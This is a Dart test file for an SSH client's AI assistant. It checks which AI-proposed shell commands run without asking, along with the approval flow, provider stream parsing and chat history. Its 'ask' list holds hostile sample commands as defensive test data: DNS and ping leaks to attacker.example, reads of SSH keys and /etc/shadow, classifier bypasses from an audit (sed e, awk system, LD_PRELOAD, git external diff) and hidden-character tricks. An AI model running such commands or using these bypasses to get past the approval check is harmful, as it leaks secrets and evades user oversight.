import 'dart:async';
import 'dart:io';
import 'dart:convert';

import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:uessh/features/ai/ai_chat.dart';
import 'package:uessh/features/ai/ai_client.dart';
import 'package:uessh/features/ai/ai_config.dart';
import 'package:uessh/features/ai/ai_history.dart';
import 'package:uessh/features/ai/ai_panel.dart';
import 'package:uessh/features/ai/command_safety.dart';
import 'package:uessh/features/hosts/host.dart';
import 'package:uessh/features/hosts/host_repository.dart';
import 'package:uessh/features/terminal/known_hosts.dart';
import 'package:uessh/features/terminal/terminal_session.dart';
import 'package:uessh/l10n/l10n.dart';

import 'test_helpers.dart';

/// A "connected" session whose commands are answered from [outputs].
class FakeSession extends TerminalSession {
  FakeSession(TestEnv env, {String label = 'web-01', String id = 'h'})
    : super(
        host: Host(
          id: id,
          label: label,
          address: '10.0.0.9',
          port: 22,
          username: 'root',
          authMethod: AuthMethod.password,
        ),
        repository: HostRepository(dataDir: env.dataDir, secrets: env.secrets),
        knownHosts: KnownHostsStore(dataDir: env.dataDir),
        prompts: FakePrompts(),
      ) {
    status = SessionStatus.connected;
  }

  final ran = <String>[];
  final outputs = <String, String>{};

  @override
  Future<CommandResult> exec(
    String command, {
    Duration timeout = const Duration(seconds: 60),
    int maxBytes = 64 * 1024,
    void Function(String text)? onStdout,
    void Function(String text)? onStderr,
    Future<void>? cancel,
  }) async {
    ran.add(command);
    if (hang.contains(command)) {
      // Runs until Stop cancels it.
      await cancel;
      cancelled.add(command);
      return const CommandResult(stdout: '', stderr: '', exitCode: 143);
    }
    final out = outputs[command] ?? 'out of $command';
    // Arrives in two pieces, like a real stream.
    onStdout?.call(out.substring(0, out.length ~/ 2));
    onStdout?.call('${out.substring(out.length ~/ 2)}\n');
    if (failing.contains(command)) onStderr?.call('boom\n');
    return CommandResult(
      stdout: out,
      stderr: failing.contains(command) ? 'boom' : '',
      exitCode: failing.contains(command) ? 2 : 0,
    );
  }

  final failing = <String>{};
  final hang = <String>{};
  final cancelled = <String>[];
}

AiDone callRun(String id, String command, {String text = ''}) => AiDone(
  AiTurn.assistant(
    text,
    toolCalls: [
      AiToolCall(
        id: id,
        name: 'run_command',
        input: {'command': command, 'purpose': 'check $command'},
      ),
    ],
  ),
);

Stream<String> _lines(String text) => Stream.fromIterable(text.split('\n'));

void main() {
  group('read-only commands', () {
    for (final c in [
      'df -h',
      'ls -la /var/log',
      'tail -n 50 /var/log/syslog | grep -i error',
      'systemctl status nginx --no-pager',
      'journalctl -u nginx -n 100 --no-pager 2>&1',
      'docker ps -a',
      'free -m && uptime',
      'cat /etc/os-release',
      'ps aux --sort=-%mem | head -20',
      'find /var/log -name "*.log" -size +100M',
      "sed -n '1,20p' /etc/hosts",
      "sed 's/a/b/g' /etc/hostname",
      "awk '{print \$1}' /etc/hosts",
      'LANG=C ls -la',
      'ls "\$HOME" \${HOME}',
      'cat /etc/hostname 2>/dev/null',
      'grep -c x < /etc/hosts',
      'git --no-pager log -5',
      'docker stats --no-stream',
      'systemctl --no-pager status ssh',
      'ls # trailing comment; rm -rf /',
      "ls \\; rm x", // an escaped ; is just an argument to ls
      'git -C /srv/app status',
      'ip addr show',
      'top -b -n1 | head -20',
      'grep ">" file.txt',
      'nginx -t',
    ]) {
      test('auto: $c', () => expect(isReadOnlyCommand(c), isTrue));
    }
    for (final c in [
      'rm -rf /tmp/x',
      'sudo systemctl restart nginx',
      'systemctl restart nginx',
      'echo hi > /etc/motd',
      'cat a >> b',
      'find / -name core -delete',
      'find . -exec rm {} \\;',
      'sed -i s/a/b/ file',
      'apt install nginx',
      'docker rm -f web',
      'kill -9 1234',
      'curl -o /tmp/x https://e.com',
      'curl -X POST https://e.com',
      'ls \$(rm -rf /)',
      'ls `reboot`',
      'chmod 777 /etc',
      'reboot',
      'ip link set eth0 down',
      'git reset --hard',
      'some-unknown-tool',
      'df -h; rm x',
      'cat x | sh',
      'crontab -r',
      'awk \'{system("rm x")}\' f',
      // Network: could send data out.
      'curl -sI https://example.com',
      'dig c2VjcmV0.attacker.example',
      'ping -c1 secret.attacker.example',
      'nslookup x.attacker.example',
      'getent hosts attacker.example',
      // Secrets: would go to the AI provider.
      'cat ~/.ssh/id_rsa',
      'cat /etc/shadow',
      'cat /srv/app/.env',
      'kubectl get secret -o yaml',
      'grep -r password /etc',
      'env',
      'printenv',
      'docker inspect web',
      // Bypasses found in the audit (all ran writes on a real server).
      r"echo \' ; touch /tmp/pwned ; echo \'",
      r"env -S'touch /tmp/pwned'",
      r"env --split-string='touch /tmp/pwned'",
      r"""awk 'BEGIN{print "x" > "/tmp/pwned"}'""",
      r"""awk 'BEGIN{system ("touch /tmp/pwned")}'""",
      r"sed -n '1e touch /tmp/pwned' /etc/hostname",
      r"sed 's/x/touch \/tmp\/pwned/e' /etc/hostname",
      r"sed -i 's/a/b/' f",
      r"sed 'w /tmp/pwned' f",
      r"git -c diff.external='sh -c touch\ /tmp/pwned' diff",
      r"git log --output=/tmp/pwned",
      r"LESSOPEN='|touch /tmp/pwned %s' less /etc/hostname",
      r"GIT_EXTERNAL_DIFF=/tmp/evil git diff",
      r"LD_PRELOAD=/tmp/evil.so ls",
      r"x='$(touch /tmp/pwned)'; echo ${x@P}",
      r"sort -o /tmp/pwned /etc/hostname",
      r"uniq /etc/hostname /tmp/pwned",
      r"tree -o /tmp/pwned /",
      r"yq -i '.a=1' /etc/x.yaml",
      r"ss -K dst 10.0.0.1",
      r"ss -tulnpK",
      r"ip -batch /tmp/cmds",
      r"hostname --file=/tmp/name",
      r"swapon --all",
      r"sysctl --load /tmp/s.conf",
      r"rpm -q --eval '%(touch /tmp/pwned)'",
      r"curl -D /tmp/pwned https://example.com",
      r"/tmp/evil/ls",
      r"echo $((1+2))",
      r"echo ${x:-$(rm x)}",
      r'echo "$(rm x)"',
      r"cat <<EOF",
      r"cat <> /etc/x",
      r"ls >& /tmp/x",
      r"( rm x )",
      r"{ rm x; }",
      "ls \u202e fr- mr",
      "ls\u200b -la",
      "echo \x1b[2Jhi",
    ]) {
      test('ask: $c', () => expect(isReadOnlyCommand(c), isFalse));
    }
  });

  group('tool calls on the wire', () {
    test(
      'Anthropic: thinking and tool_use blocks are kept for replay',
      () async {
        const sse = '''
event: content_block_start
data: {"type":"content_block_start","index":0,"content_block":{"type":"thinking","thinking":""}}

event: content_block_delta
data: {"type":"content_block_delta","index":0,"delta":{"type":"thinking_delta","thinking":"hmm"}}

event: content_block_delta
data: {"type":"content_block_delta","index":0,"delta":{"type":"signature_delta","signature":"SIG"}}

event: content_block_start
data: {"type":"content_block_start","index":1,"content_block":{"type":"text","text":""}}

event: content_block_delta
data: {"type":"content_block_delta","index":1,"delta":{"type":"text_delta","text":"Checking."}}

event: content_block_start
data: {"type":"content_block_start","index":2,"content_block":{"type":"tool_use","id":"toolu_1","name":"run_command","input":{}}}

event: content_block_delta
data: {"type":"content_block_delta","index":2,"delta":{"type":"input_json_delta","partial_json":"{\\"command\\": \\"df"}}

event: content_block_delta
data: {"type":"content_block_delta","index":2,"delta":{"type":"input_json_delta","partial_json":" -h\\"}"}}

event: message_delta
data: {"type":"message_delta","delta":{"stop_reason":"tool_use"}}
''';
        final done = (await parseAnthropicSse(
          _lines(sse),
        ).toList()).whereType<AiDone>().single;
        final call = done.turn.toolCalls.single;
        expect(call.id, 'toolu_1');
        expect(call.input, {'command': 'df -h'});
        final blocks = done.turn.anthropicBlocks!;
        expect(blocks.map((b) => b['type']), ['thinking', 'text', 'tool_use']);
        expect(blocks[0]['thinking'], 'hmm');
        expect(blocks[0]['signature'], 'SIG');
        expect(blocks[2]['input'], {'command': 'df -h'});
      },
    );

    test('Anthropic: tools before a mid-output fallback are dropped', () async {
      const sse = '''
event: content_block_start
data: {"type":"content_block_start","index":0,"content_block":{"type":"tool_use","id":"t_old","name":"run_command","input":{}}}

event: content_block_delta
data: {"type":"content_block_delta","index":0,"delta":{"type":"input_json_delta","partial_json":"{\\"command\\":\\"rm x\\"}"}}

event: content_block_start
data: {"type":"content_block_start","index":1,"content_block":{"type":"fallback","from":{"model":"a"},"to":{"model":"b"}}}

event: content_block_start
data: {"type":"content_block_start","index":2,"content_block":{"type":"text","text":""}}

event: content_block_delta
data: {"type":"content_block_delta","index":2,"delta":{"type":"text_delta","text":"ok"}}

event: message_delta
data: {"type":"message_delta","delta":{"stop_reason":"end_turn"}}
''';
      final done = (await parseAnthropicSse(
        _lines(sse),
      ).toList()).whereType<AiDone>().single;
      expect(done.turn.toolCalls, isEmpty);
      expect(done.turn.anthropicBlocks!.map((b) => b['type']), ['text']);
    });

    test('Anthropic: a cut-off tool call is never run', () async {
      const sse = '''
event: content_block_start
data: {"type":"content_block_start","index":0,"content_block":{"type":"tool_use","id":"t","name":"run_command","input":{}}}

event: content_block_delta
data: {"type":"content_block_delta","index":0,"delta":{"type":"input_json_delta","partial_json":"{\\"command\\":\\"rm -rf /var/l"}}

event: message_delta
data: {"type":"message_delta","delta":{"stop_reason":"max_tokens"}}
''';
      final out = await parseAnthropicSse(_lines(sse)).toList();
      expect(out.whereType<AiTruncated>(), hasLength(1));
      expect(out.whereType<AiDone>().single.turn.toolCalls, isEmpty);
    });

    test('OpenAI: tool_calls fragments are joined', () async {
      const sse = '''
data: {"choices":[{"delta":{"tool_calls":[{"index":0,"id":"call_a","function":{"name":"run_command","arguments":"{\\"comm"}}]}}]}

data: {"choices":[{"delta":{"tool_calls":[{"index":0,"function":{"arguments":"and\\":\\"uptime\\"}"}}]},"finish_reason":"tool_calls"}]}

data: [DONE]
''';
      final done = (await parseOpenAiSse(
        _lines(sse),
      ).toList()).whereType<AiDone>().single;
      final call = done.turn.toolCalls.single;
      expect(call.id, 'call_a');
      expect(call.name, 'run_command');
      expect(call.input, {'command': 'uptime'});
    });

    test('request bodies carry tools, calls and results', () {
      final turns = [
        const AiTurn.user('check disk'),
        const AiTurn.assistant(
          '',
          toolCalls: [
            AiToolCall(id: 'c1', name: 'run_command', input: {'command': 'df'}),
          ],
          anthropicBlocks: [
            {'type': 'thinking', 'thinking': 't', 'signature': 's'},
            {
              'type': 'tool_use',
              'id': 'c1',
              'name': 'run_command',
              'input': {'command': 'df'},
            },
          ],
        ),
        const AiTurn.user(
          '',
          toolResults: [AiToolResult(callId: 'c1', content: 'exit code: 0')],
        ),
      ];
      final a = anthropicBody(
        model: 'm',
        system: 's',
        turns: turns,
        tools: aiTools,
        official: true,
      );
      final messages = a['messages'] as List;
      expect((messages[1] as Map)['content'], turns[1].anthropicBlocks);
      expect(((messages[2] as Map)['content'] as List).single, {
        'type': 'tool_result',
        'tool_use_id': 'c1',
        'content': 'exit code: 0',
      });
      final tool = (a['tools'] as List).first as Map;
      expect(tool['name'], 'run_command');
      expect(tool['eager_input_streaming'], isTrue);
      expect(
        (anthropicBody(
                  model: 'm',
                  system: 's',
                  turns: turns,
                  tools: aiTools,
                  official: false,
                )['tools']
                as List)
            .first,
        isNot(contains('eager_input_streaming')),
      );

      final o = openAiBody(
        model: 'm',
        system: 's',
        turns: turns,
        tools: aiTools,
      );
      final om = (o['messages'] as List).cast<Map>();
      expect(om.map((m) => m['role']), ['system', 'user', 'assistant', 'tool']);
      expect(om[2]['content'], isNull);
      final tc = (om[2]['tool_calls'] as List).single as Map;
      expect(tc['id'], 'c1');
      expect(jsonDecode((tc['function'] as Map)['arguments'] as String), {
        'command': 'df',
      });
      expect(om[3], {
        'role': 'tool',
        'tool_call_id': 'c1',
        'content': 'exit code: 0',
      });
      expect(((o['tools'] as List).first as Map)['type'], 'function');
    });
  });

  group('tool loop', () {
    late TestEnv env;
    late ProviderContainer c;
    late FakeSession session;
    const model = (providerId: 'anthropic', model: 'm');

    setUp(() async {
      env = TestEnv();
      c = ProviderContainer(overrides: env.overrides);
      session = FakeSession(env);
      await c.read(aiConfigProvider.future);
      await c
          .read(aiConfigProvider.notifier)
          .saveProvider(AiProvider.builtIn(AiVendor.anthropic), apiKey: 'k');
    });
    tearDown(() {
      c.dispose();
      env.dispose();
    });

    AiChatNotifier chat() => c.read(aiChatProvider(session.id).notifier);
    AiChatState state() => c.read(aiChatProvider(session.id));
    List<AiToolRun> tools() => [for (final m in state().messages) ...m.tools];

    Future<void> until(bool Function() done) async {
      for (var i = 0; i < 1000 && !done(); i++) {
        await Future<void>.delayed(const Duration(milliseconds: 5));
      }
      expect(done(), isTrue, reason: 'timed out');
    }

    test('read-only commands run by themselves; results go back', () async {
      env.ai.script.addAll([
        [const AiText('Let me look.'), callRun('t1', 'df -h')],
        [const AiText('Disk is fine.')],
      ]);
      await chat().send('disk?', model: model, session: session);
      await until(() => !state().busy);

      expect(session.ran, ['df -h']);
      expect(tools().single.state, AiToolState.done);
      expect(state().messages.last.text, 'Disk is fine.');
      final second = env.ai.requests.last;
      expect(second.tools.map((t) => t.name), contains('run_command'));
      expect(second.system, contains('run_command'));
      final results = second.turns.last.toolResults.single;
      expect(results.callId, 't1');
      expect(results.content, contains('out of df -h'));
      expect(results.content, contains('exit code: 0'));
    });

    test(
      'commands show in the terminal as they run; prompt restored',
      () async {
        session.terminal.write('root@web-01:~# ls -l');
        env.ai.script.addAll([
          [callRun('t1', 'df -h')],
          [callRun('t2', 'cat /nope')],
          [const AiText('Done.')],
        ]);
        session.failing.add('cat /nope');
        await chat().send('disk?', model: model, session: session);
        await until(() => !state().busy);

        final lines = session.terminal.buffer
            .getText()
            .split('\n')
            .map((l) => l.trimRight())
            .where((l) => l.isNotEmpty)
            .toList();
        // Box and rule as wide as the terminal (80 columns, less one).
        String rule(String label) {
          final head = '── $label ';
          return head + '─' * (79 - head.length);
        }

        List<String> box(String command) => [
          '┌${'─' * 77}┐',
          '│${' ' * 34}UESSH AI${' ' * 35}│',
          '├${'─' * 77}┤',
          '│ \$ $command${' ' * (74 - command.length)}│',
          '└${'─' * 77}┘',
        ];

        expect(lines, [
          'root@web-01:~# ls -l',
          ...box('df -h'),
          'out of df -h',
          rule('✓ exit 0 · 0.0s'),
          'root@web-01:~# ls -l', // prompt and typed text drawn again
          ...box('cat /nope'),
          'out of cat /nope',
          'boom',
          rule('✗ exit 2 · 0.0s'),
          'root@web-01:~# ls -l',
        ]);
        // Cursor back after the typed text.
        expect(session.terminal.buffer.cursorX, 'root@web-01:~# ls -l'.length);
      },
    );

    test('a full-screen program keeps its screen untouched', () async {
      session.terminal.write('\x1b[?1049h'); // e.g. vim switched screens
      session.terminal.write('VIM SCREEN');
      final r = await session.execShown('uptime');
      expect(r.stdout, 'out of uptime');
      expect(session.terminal.buffer.getText(), isNot(contains('UESSH AI')));
      session.terminal.write('\x1b[?1049l');
      expect(session.terminal.buffer.getText(), isNot(contains('UESSH AI')));
    });

    test('conversations are saved encrypted and can be reopened', () async {
      env.ai.script.addAll([
        [const AiText('Checking.'), callRun('t1', 'df -h')],
        [const AiText('Disk is 42% full.')],
      ]);
      session.outputs['df -h'] = 'SECRET-OUTPUT /dev/sda1 42%';
      await chat().send(
        'Why is the disk full?\nmore',
        model: model,
        session: session,
      );
      await until(() => !state().busy);
      await until(
        () => (c.read(aiHistoryProvider).value ?? const []).isNotEmpty,
      );
      // Saving is async; let the writes finish.
      await Future<void>.delayed(const Duration(milliseconds: 100));

      final list = c.read(aiHistoryProvider).value!;
      expect(list, hasLength(1));
      final info = list.single;
      expect(info.title, 'Why is the disk full?');
      expect(info.hostId, 'h');
      expect(info.hostName, 'web-01');
      expect(info.model, 'm');

      // On disk: nothing readable.
      final dir = Directory('${env.dataDir.path}/ai_history');
      for (final f in dir.listSync().whereType<File>()) {
        final text = f.readAsStringSync();
        expect(text, isNot(contains('SECRET-OUTPUT')));
        expect(text, isNot(contains('disk full')));
      }

      // Another tab opens it and carries on with the full history.
      final other = FakeSession(env);
      final n2 = c.read(aiChatProvider(other.id).notifier);
      expect(await n2.open(info.id), isTrue);
      final restored = c.read(aiChatProvider(other.id));
      expect(restored.messages.first.text, 'Why is the disk full?\nmore');
      expect(restored.messages.last.text, 'Disk is 42% full.');
      expect(
        restored.messages.expand((m) => m.tools).single.output,
        contains('SECRET-OUTPUT'),
      );
      await n2.send('thanks', model: model, session: other);
      await until(() => !c.read(aiChatProvider(other.id)).busy);
      final turns = env.ai.requests.last.turns;
      expect(turns.first.text, 'Why is the disk full?\nmore');
      expect(turns.any((t) => t.toolResults.isNotEmpty), isTrue);
      expect(turns.last.text, 'thanks');
      await Future<void>.delayed(const Duration(milliseconds: 100));
      expect(c.read(aiHistoryProvider).value, hasLength(1), reason: 'same one');

      // New chat: a separate entry.
      n2.clear();
      await n2.send('second', model: model, session: other);
      await until(() => !c.read(aiChatProvider(other.id)).busy);
      await Future<void>.delayed(const Duration(milliseconds: 100));
      expect(c.read(aiHistoryProvider).value, hasLength(2));
      expect(c.read(aiHistoryProvider).value!.first.title, 'second');

      // Survives a restart (fresh container, same files and key).
      final c2 = ProviderContainer(overrides: env.overrides);
      addTearDown(c2.dispose);
      expect(await c2.read(aiHistoryProvider.future), hasLength(2));

      await c.read(aiHistoryProvider.notifier).delete(info.id);
      expect(c.read(aiHistoryProvider).value, hasLength(1));
      expect(File('${dir.path}/${info.id}.json').existsSync(), isFalse);
      await c.read(aiHistoryProvider.notifier).clear();
      expect(c.read(aiHistoryProvider).value, isEmpty);
      expect(dir.existsSync(), isFalse);
    });

    test('Stop ends a running command on the server', () async {
      await c.read(aiConfigProvider.notifier).setToolMode(AiToolMode.allowAll);
      session.hang.add('sleep 100');
      env.ai.script.add([callRun('t1', 'sleep 100')]);
      unawaited(chat().send('wait', model: model, session: session));
      await until(() => session.ran.isNotEmpty);
      chat().stop();
      await until(() => session.cancelled.isNotEmpty);
      expect(session.cancelled, ['sleep 100']);
    });

    test(
      '"ask for every command" also asks before reading the screen',
      () async {
        await c.read(aiConfigProvider.notifier).setToolMode(AiToolMode.askAll);
        session.terminal.write('secret-looking screen');
        env.ai.script.addAll([
          [
            const AiDone(
              AiTurn.assistant(
                '',
                toolCalls: [
                  AiToolCall(
                    id: 'r1',
                    name: 'read_terminal',
                    input: {'lines': 10},
                  ),
                ],
              ),
            ),
          ],
          [const AiText('ok')],
        ]);
        unawaited(chat().send('look', model: model, session: session));
        await until(() => tools().isNotEmpty);
        expect(tools().single.state, AiToolState.waiting);
        chat().deny('r1');
        await until(() => !state().busy);
        final result = env.ai.requests.last.turns.last.toolResults.single;
        expect(result.content, isNot(contains('secret-looking')));
        expect(result.content, contains('declined'));
      },
    );

    test('hidden characters are shown, not sent to the terminal', () async {
      await c.read(aiConfigProvider.notifier).setToolMode(AiToolMode.allowAll);
      final sneaky = 'ls\x1b[2K\x1b[1Aecho fine \u202e';
      session.outputs[sneaky] = 'plain output';
      env.ai.script.addAll([
        [callRun('t1', sneaky)],
        [const AiText('done')],
      ]);
      await chat().send('go', model: model, session: session);
      await until(() => !state().busy);
      final screen = session.terminal.buffer.getText();
      expect(screen, contains('\$ ls<U+001B>[2K<U+001B>[1Aecho fine <U+202E>'));
      expect(tools().single.host, 'web-01 (root@10.0.0.9)');
    });

    test(
      'continuing another host\'s conversation says so to the model',
      () async {
        env.ai.script.add([const AiText('first')]);
        await chat().send('hello', model: model, session: session);
        await until(() => !state().busy);
        await until(
          () => (c.read(aiHistoryProvider).value ?? const []).isNotEmpty,
        );
        await Future<void>.delayed(const Duration(milliseconds: 100));
        final id = c.read(aiHistoryProvider).value!.single.id;

        final other = FakeSession(env, label: 'db-02', id: 'h2');
        final n2 = c.read(aiChatProvider(other.id).notifier);
        await n2.open(id);
        await n2.send('and now?', model: model, session: other);
        await until(() => !c.read(aiChatProvider(other.id)).busy);
        final sent = env.ai.requests.last.turns.last.text;
        expect(sent, contains('started on web-01'));
        expect(sent, contains('db-02'));
        expect(sent, endsWith('and now?'));
      },
    );

    test('a changing command waits; Allow runs it', () async {
      env.ai.script.addAll([
        [callRun('t1', 'systemctl restart nginx')],
        [const AiText('Restarted.')],
      ]);
      unawaited(chat().send('restart nginx', model: model, session: session));
      await until(() => tools().isNotEmpty);
      expect(tools().single.state, AiToolState.waiting);
      expect(tools().single.readOnly, isFalse);
      expect(session.ran, isEmpty);

      chat().approve('t1');
      await until(() => !state().busy);
      expect(session.ran, ['systemctl restart nginx']);
      expect(state().messages.last.text, 'Restarted.');
    });

    test('Decline: not run, and the model is told', () async {
      env.ai.script.addAll([
        [callRun('t1', 'rm -rf /var/cache/app')],
        [const AiText('OK, left it.')],
      ]);
      unawaited(chat().send('clean cache', model: model, session: session));
      await until(() => tools().isNotEmpty);
      chat().deny('t1');
      await until(() => !state().busy);
      expect(session.ran, isEmpty);
      expect(tools().single.state, AiToolState.denied);
      expect(
        env.ai.requests.last.turns.last.toolResults.single.content,
        contains('declined'),
      );
    });

    test('"ask for every command" also holds read-only ones', () async {
      await c.read(aiConfigProvider.notifier).setToolMode(AiToolMode.askAll);
      env.ai.script.add([callRun('t1', 'uptime')]);
      unawaited(chat().send('load?', model: model, session: session));
      await until(() => tools().isNotEmpty);
      expect(tools().single.state, AiToolState.waiting);
      chat().stop();
    });

    test('"allow all": even changing commands run without asking', () async {
      await c.read(aiConfigProvider.notifier).setToolMode(AiToolMode.allowAll);
      env.ai.script.addAll([
        [callRun('t1', 'systemctl restart nginx')],
        [const AiText('Restarted.')],
      ]);
      await chat().send('restart', model: model, session: session);
      await until(() => !state().busy);
      expect(session.ran, ['systemctl restart nginx']);
      expect(tools().single.state, AiToolState.done);
    });

    test('mode off: no tools offered', () async {
      await c.read(aiConfigProvider.notifier).setToolMode(AiToolMode.off);
      await chat().send('hi', model: model, session: session);
      await until(() => !state().busy);
      expect(env.ai.requests.single.tools, isEmpty);
      expect(env.ai.requests.single.system, isNot(contains('run_command')));
    });

    test(
      'Stop while waiting closes the call; the next message works',
      () async {
        env.ai.script.add([callRun('t1', 'reboot')]);
        unawaited(chat().send('reboot it', model: model, session: session));
        await until(() => tools().isNotEmpty);
        chat().stop();
        expect(state().busy, isFalse);
        expect(tools().single.state, AiToolState.denied);

        await chat().send('never mind', model: model, session: session);
        await until(() => !state().busy);
        expect(session.ran, isEmpty);
        final turns = env.ai.requests.last.turns;
        // user, assistant(tool call), user(tool result + new text)
        expect(turns.map((t) => t.fromUser), [true, false, true]);
        expect(turns.last.toolResults.single.callId, 't1');
        expect(turns.last.text, 'never mind');
      },
    );
  });

  testWidgets('approval card: Allow / Decline buttons in the chat', (
    tester,
  ) async {
    final env = TestEnv();
    addTearDown(env.dispose);
    final c = ProviderContainer(overrides: env.overrides);
    addTearDown(c.dispose);
    final session = FakeSession(env);
    await tester.runAsync(() async {
      await c.read(aiConfigProvider.future);
      await c
          .read(aiConfigProvider.notifier)
          .saveProvider(AiProvider.builtIn(AiVendor.anthropic), apiKey: 'k');
      await c.read(aiConfigProvider.notifier).select((
        providerId: 'anthropic',
        model: 'm',
      ));
    });
    env.ai.script.addAll([
      [
        const AiText('I will restart it.'),
        callRun('t1', 'systemctl restart nginx'),
      ],
      [const AiText('Done.')],
    ]);
    tester.view.physicalSize = const Size(500, 900);
    tester.view.devicePixelRatio = 1;
    addTearDown(tester.view.reset);
    await tester.pumpWidget(
      UncontrolledProviderScope(
        container: c,
        child: MaterialApp(
          locale: const Locale('zh'),
          supportedLocales: AppLocalizations.supportedLocales,
          localizationsDelegates: AppLocalizations.localizationsDelegates,
          home: Scaffold(
            body: AiPanel(session: session, onClose: () {}),
          ),
        ),
      ),
    );
    await settleIo(tester);

    await tester.enterText(find.byKey(const ValueKey('ai-input')), '重启 nginx');
    await tester.pump();
    await tester.tap(find.byKey(const ValueKey('ai-send')));
    await pumpUntil(
      tester,
      () => tester.any(find.byKey(const ValueKey('ai-approve-t1'))),
    );
    expect(find.text('systemctl restart nginx'), findsOneWidget);
    expect(find.text('check systemctl restart nginx'), findsOneWidget);
    expect(find.text('等待你允许'), findsOneWidget);
    expect(find.text('在 web-01 (root@10.0.0.9) 上执行'), findsOneWidget);
    expect(find.textContaining('可能会修改服务器'), findsOneWidget);
    expect(session.ran, isEmpty);
    // While waiting, the send button is a stop button.
    expect(find.byKey(const ValueKey('ai-stop')), findsOneWidget);

    await tester.tap(find.byKey(const ValueKey('ai-approve-t1')));
    await pumpUntil(tester, () => tester.any(find.text('Done.')));
    expect(session.ran, ['systemctl restart nginx']);
    expect(find.byKey(const ValueKey('ai-approve-t1')), findsNothing);
    expect(find.text('完成'), findsOneWidget);
    await tester.tap(find.text('显示输出'));
    await tester.pumpAndSettle();
    expect(find.text('out of systemctl restart nginx'), findsOneWidget);
  });

  Future<(ProviderContainer, FakeSession)> pumpPanel(
    WidgetTester tester,
    TestEnv env, {
    AiToolMode mode = AiToolMode.autoReadOnly,
  }) async {
    final c = ProviderContainer(overrides: env.overrides);
    addTearDown(c.dispose);
    final session = FakeSession(env);
    await tester.runAsync(() async {
      await c.read(aiConfigProvider.future);
      final n = c.read(aiConfigProvider.notifier);
      await n.saveProvider(AiProvider.builtIn(AiVendor.anthropic), apiKey: 'k');
      await n.select((providerId: 'anthropic', model: 'm'));
      await n.setToolMode(mode);
    });
    tester.view.physicalSize = const Size(600, 900);
    tester.view.devicePixelRatio = 1;
    addTearDown(tester.view.reset);
    await tester.pumpWidget(
      UncontrolledProviderScope(
        container: c,
        child: MaterialApp(
          locale: const Locale('zh'),
          supportedLocales: AppLocalizations.supportedLocales,
          localizationsDelegates: AppLocalizations.localizationsDelegates,
          home: Scaffold(
            body: AiPanel(session: session, onClose: () {}),
          ),
        ),
      ),
    );
    await settleIo(tester);
    return (c, session);
  }

  testWidgets('a multi-line paste that would run asks first', (tester) async {
    final env = TestEnv();
    addTearDown(env.dispose);
    env.ai.script.add([
      const AiText(
        'Try:\n\n```bash\nsystemctl stop app\nrm -rf /srv/app/cache\n```',
      ),
    ]);
    final (_, session) = await pumpPanel(tester, env);
    final pasted = <String>[];
    session.terminal.onOutput = pasted.add;

    await tester.enterText(find.byKey(const ValueKey('ai-input')), 'how?');
    await tester.pump();
    await tester.tap(find.byKey(const ValueKey('ai-send')));
    await pumpUntil(
      tester,
      () =>
          tester.any(find.text('rm -rf /srv/app/cache', findRichText: true)) ||
          tester.any(find.byKey(const ValueKey('ai-paste-to-terminal'))),
    );
    await tester.pumpAndSettle();

    // No bracketed paste on this shell: ask, and Cancel pastes nothing.
    await tester.tap(find.byKey(const ValueKey('ai-paste-to-terminal')));
    await tester.pumpAndSettle();
    expect(find.text('粘贴后会直接执行'), findsOneWidget);
    expect(find.textContaining('前 1 行'), findsOneWidget);
    await tester.tap(find.text('取消'));
    await tester.pumpAndSettle();
    expect(pasted, isEmpty);

    // With bracketed paste on, it's safe: pasted straight away, not run.
    session.terminal.write('\x1b[?2004h');
    await tester.tap(find.byKey(const ValueKey('ai-paste-to-terminal')));
    await tester.pumpAndSettle();
    expect(find.text('粘贴后会直接执行'), findsNothing);
    expect(pasted.single, startsWith('\x1b[200~'));
    expect(pasted.single, endsWith('\x1b[201~'));
  });

  testWidgets('"allow all" shows a warning bar in the panel', (tester) async {
    final env = TestEnv();
    addTearDown(env.dispose);
    await pumpPanel(tester, env, mode: AiToolMode.allowAll);
    expect(find.byKey(const ValueKey('ai-allow-all-banner')), findsOneWidget);
  });

  testWidgets('no warning bar otherwise', (tester) async {
    final env = TestEnv();
    addTearDown(env.dispose);
    await pumpPanel(tester, env);
    expect(find.byKey(const ValueKey('ai-allow-all-banner')), findsNothing);
  });

  test('API keys only over HTTPS (or to this computer)', () async {
    expect(isAllowedApiUrl(Uri.parse('https://api.example.com/v1')), isTrue);
    expect(isAllowedApiUrl(Uri.parse('http://localhost:11434/v1')), isTrue);
    expect(isAllowedApiUrl(Uri.parse('http://127.0.0.1:8080')), isTrue);
    expect(isAllowedApiUrl(Uri.parse('http://api.example.com/v1')), isFalse);
    expect(isAllowedApiUrl(Uri.parse('http://10.0.0.5/v1')), isFalse);
    expect(isAllowedApiUrl(Uri.parse('ftp://x')), isFalse);
    const plain = AiProvider(
      id: 'c',
      vendor: AiVendor.custom,
      name: 'x',
      baseUrl: 'http://api.example.com/v1',
    );
    await expectLater(
      HttpAiClient().listModels(plain, 'k'),
      throwsA(isA<AiException>()),
    );
    expect(
      HttpAiClient()
          .chat(
            provider: plain,
            apiKey: 'k',
            model: 'm',
            system: '',
            turns: const [AiTurn.user('hi')],
          )
          .toList(),
      throwsA(isA<AiException>()),
    );
  });

  group('aiCommandBox', () {
    int width(String line) =>
        line.runes.fold(0, (w, r) => w + terminalCellWidth(r));

    test('every row the same width; title centered', () {
      final rows = aiCommandBox('df -h', 30);
      expect(rows, [
        '┌────────────────────────────┐',
        '│          UESSH AI          │',
        '├────────────────────────────┤',
        '│ \$ df -h                    │',
        '└────────────────────────────┘',
      ]);
    });

    test('Chinese (two columns each) keeps the right border straight', () {
      final rows = aiCommandBox('echo 你好世界', 30);
      for (final r in rows) {
        expect(width(r), 30, reason: r);
      }
      expect(rows[3], startsWith('│ \$ echo 你好世界'));
    });

    test('long commands wrap inside; very long ones end with …', () {
      final rows = aiCommandBox('x' * 60, 30);
      // 24 per row: "│ \$ " + 24 + " │" is 30.
      expect(rows.sublist(3, rows.length - 1), [
        '│ \$ ${'x' * 24} │',
        '│   ${'x' * 24} │',
        '│   ${'x' * 12}${' ' * 12} │',
      ]);
      final many = aiCommandBox(List.filled(30, 'ls').join('\n'), 30);
      expect(many.length, 3 + 12 + 1);
      expect(many[many.length - 2], startsWith('│   …'));
      for (final r in [...rows, ...many]) {
        expect(width(r), 30, reason: r);
      }
    });

    test('control characters are shown, never sent', () {
      final rows = aiCommandBox('echo hi\x1b[2J\x07', 40);
      expect(rows.join(), isNot(contains('\x1b')));
      expect(rows.join(), isNot(contains('\x07')));
